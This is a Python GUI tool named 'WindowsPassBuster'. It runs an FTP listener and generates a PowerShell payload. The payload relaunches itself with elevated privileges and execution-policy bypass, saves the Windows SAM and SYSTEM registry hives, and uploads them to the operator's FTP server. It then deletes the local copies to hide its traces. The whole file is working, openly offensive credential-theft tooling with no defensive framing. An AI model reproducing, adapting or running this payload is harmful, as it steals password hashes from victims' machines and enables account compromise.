import ttkbootstrap as ttk
from ttkbootstrap.constants import *
import os
from tkinter import IntVar
from tkinter import filedialog
from tkinter import messagebox
from pyftpdlib import servers
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.authorizers import DummyAuthorizer
import threading

def run_ftp_server(username,password,directory,port,ip_address,port_val):
    try:
        # Define the username and password for authentication
        username = username.get()
        password = password.get()
        ip_address=ip_address.get()
        directory=directory.get()
        port=port.get()
        port_val=port_val.get()
        print(f"port value is {port_val}")
        if port_val==1:
            port=21

        # Define the FTP directory where files will be uploaded
        ftp_directory = directory  # Replace this with your desired directory

        # Create the directory if it doesn't exist
        if not os.path.exists(ftp_directory):
            os.makedirs(ftp_directory)

        # Define an authorizer with the specified username and password
        authorizer = DummyAuthorizer()
        authorizer.add_user(username, password, ftp_directory, perm="elradfmw")

        # Define the FTP handler and pass the authorizer to it
        handler = FTPHandler
        handler.authorizer = authorizer

        # Set a custom welcome message
        handler.banner = "Welcome to WindowsPassBusters FTP Server!"

        # Define the server and bind it to listen on localhost and port 2121
        server = servers.FTPServer((ip_address, port), handler)

        # Start the server
        
        server.serve_forever()
        messagebox.showinfo("Information", "Server Started!")
    except:
        messagebox.ERROR("Error","Server was unable to start!")


def run_server_in_thread(username, password, directory, port, ip_address, port_val):
    server_thread = threading.Thread(target=run_ftp_server, args=(username, password, directory, port, ip_address, port_val))
    server_thread.start()



def generate_payload_func(ftp_port, username, password, ip_address,ftp_radio):
    
    ftp_port=ftp_port.get()
    username=username.get()
    password=password.get()
    ip_address=ip_address.get()
    ftp_radio=ftp_radio.get()
    
    if ftp_radio == 1:
        ftp_port="21"
    
    
    payload = f"""
    # Check if the script is running with administrative privileges
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

    if (-not $isAdmin) {{
        Write-Host "Script not running as administrator. Restarting with elevated privileges..."
        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
        exit
    }}

    # Set your FTP server details
    # Set the local paths for saving the registry hives
    $localPathSAM = "C:\ProgramData\sam.save"
    $localPathSYSTEM = "C:\ProgramData\system.save"

    # Save the SAM registry hive
    try {{
        Write-Host "Saving the SAM registry hive..."
        reg save "HKLM\sam" $localPathSAM
        Write-Host "SAM registry hive saved to $localPathSAM"
    }}
    catch {{
        Write-Host "An error occurred while saving the SAM registry hive: $_"
        exit 1
    }}

    # Save the SYSTEM registry hive
    try {{
        Write-Host "Saving the SYSTEM registry hive..."
        reg save "HKLM\system" $localPathSYSTEM
        Write-Host "SYSTEM registry hive saved to $localPathSYSTEM"
    }}
    catch {{
        Write-Host "An error occurred while saving the SYSTEM registry hive: $_"
        exit 1
    }}

    # Set the FTP server URL, username, and password
    $ftpServer = "ftp://{ip_address}:{ftp_port}"
    $username = "{username}"
    $password = "{password}"

    # Upload the SAM registry hive
    $webClient = New-Object System.Net.WebClient
    $webClient.Credentials = New-Object System.Net.NetworkCredential($username, $password)
    $remoteFileNameSAM = "sam.save"
    $remoteFilePathSAM = "$ftpServer/$remoteFileNameSAM"
    $webClient.UploadFile($remoteFilePathSAM, $localPathSAM)
    $webClient.Dispose()
    Write-Host "SAM registry hive uploaded successfully!"

    # Upload the SYSTEM registry hive
    $webClient = New-Object System.Net.WebClient
    $webClient.Credentials = New-Object System.Net.NetworkCredential($username, $password)
    $remoteFileNameSYSTEM = "system.save"
    $remoteFilePathSYSTEM = "$ftpServer/$remoteFileNameSYSTEM"
    $webClient.UploadFile($remoteFilePathSYSTEM, $localPathSYSTEM)
    $webClient.Dispose()
    Write-Host "SYSTEM registry hive uploaded successfully!"

    # Clean up - delete the local files
    Remove-Item -Path $localPathSAM -Force
    Remove-Item -Path $localPathSYSTEM -Force
    Write-Host "Local files deleted"
    """
    
    with open("payload.ps1", "w") as file:
        file.write(payload)
        
    messagebox.showinfo("Information", "Payload was generated successfully!")





def browse_file(path):
    file_path = filedialog.askdirectory(title="Select a folder")
    if file_path:
       path.insert(0, file_path)
    else:
        path.insert(0, "No Path was Selected")
        
def clear_text(path):
    path.delete(0, ttk.END)



app = ttk.Window("WindowsPassBuster", "journal")
style = ttk.Style("pulse")

frame=ttk.LabelFrame(text="FTP Server")
welcome=ttk.Label(text="Welcome to WindowsPassBuster!")
frame_2=ttk.Frame()
script_dir = os.path.dirname(os.path.abspath(__file__))
image_path=os.path.join(script_dir, "Logo.png")
logo_image=ttk.PhotoImage(file=image_path)
logo_image_label=ttk.Label(image=logo_image)



var_group1 = IntVar()

#Logo Image
logo_image_label.pack()

#Frame Elements
ftp_path_label=ttk.Label(frame,text="Path to FTP Directory")
browse_ftp_location=ttk.Button(frame,text="Browse",bootstyle="info",width=50,command=lambda:browse_file(path))
clear_ftp_location=ttk.Button(frame,text="Clear",bootstyle=DANGER,width=18,command=lambda:clear_text(path))
path=ttk.Entry(frame,bootstyle="info",width=50)
ftp_port=ttk.Label(frame, text="FTP Port: ")
port_option=ttk.Radiobutton(frame,text="Default (21)",variable=var_group1,value=1,bootstyle=DANGER)
port_option_2=ttk.Radiobutton(frame, text="Custom Port (Specify): ",variable=var_group1,value=2,bootstyle=DANGER)
port_option_3=ttk.Entry(frame,bootstyle="info")
username=ttk.Label(frame,text="Client Username: ")
username_input=ttk.Entry(frame,bootstyle="info"
                         )
password=ttk.Label(frame,text="Client Password: ")
password_input=ttk.Entry(frame,bootstyle="info")
generate_payload=ttk.Button(frame_2,bootstyle="info", text="Generate Payload",command=lambda:generate_payload_func(port_option_3,username_input,password_input,ftp_ip_input,var_group1))
start_ftp_server=ttk.Button(frame_2, bootstyle="danger",text="Start FTP Server",command=lambda:run_server_in_thread(username_input,password_input,path,port_option_3,ftp_ip_input,var_group1))
ftp_ip=ttk.Label(frame, text="IP Address (Server): ")
ftp_ip_input=ttk.Entry(frame,bootstyle=INFO)



#grid elements (Frame 1)
frame.pack(pady="5px",fill=BOTH)
ftp_path_label.grid(row=0,column=0)
path.grid(row=0,column=1,padx="10px")
browse_ftp_location.grid(row=0,column=2)
clear_ftp_location.grid(row=0,column=3)

ftp_port.grid(row=1,column=0)
port_option.grid(row=1,column=1,pady="5px")
port_option_2.grid(row=1,column=2,pady="5px")
port_option_3.grid(row=1,column=3,pady="5px")
username.grid(row=2,column=0,pady="5px")
username_input.grid(row=2,column=1,pady="5px",columnspan=True)
password.grid(row=2,column=2,pady="5px")
password_input.grid(row=2,column=3,pady="5px",sticky="w")

ftp_ip.grid(row=3,column=0,pady=5)
ftp_ip_input.grid(row=3,column=1,pady=5)




#grid elements (Frame 2)
frame_2.pack(pady="10px")
generate_payload.grid(column=0,row=0,padx="2px")
start_ftp_server.grid(row=0,column=1,padx="2px")



app.mainloop()